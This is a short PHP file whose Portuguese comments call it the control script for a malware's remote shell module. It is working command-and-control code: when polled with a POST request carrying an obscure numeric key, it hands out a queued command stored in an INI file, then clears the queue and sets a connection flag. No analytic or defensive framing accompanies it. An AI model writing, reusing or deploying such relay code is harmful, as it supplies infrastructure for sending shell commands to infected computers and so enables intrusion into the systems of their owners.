<?php
//
// 8748940939845.php ~~ RemoteShellCTL.php
//  Arquivo de controle do módulo de Remote Shell do Malware.
//

	error_reporting(0);
	if (isset($_POST["829492"])) {
		
		$CTLINI = parse_ini_file("CTL.ini", "CTL");
		$CTLIDX = $CTLINI["CTL"]["CMX"];
		
		$lenX = strlen($CTLIDX);
		if ($lenX > 1) {
			echo $CTLIDX;
			
			$buf = "[CTL]\nCMX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
			$buf = "[CTL]\nCN=1\n"; $file = fopen("CTLCN.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		} else {
			echo "0";
	
			$buf = "[CTL]\nCMX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
			$buf = "[CTL]\nCN=1\n"; $file = fopen("CTLCN.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		}
	}

// EOF
?>
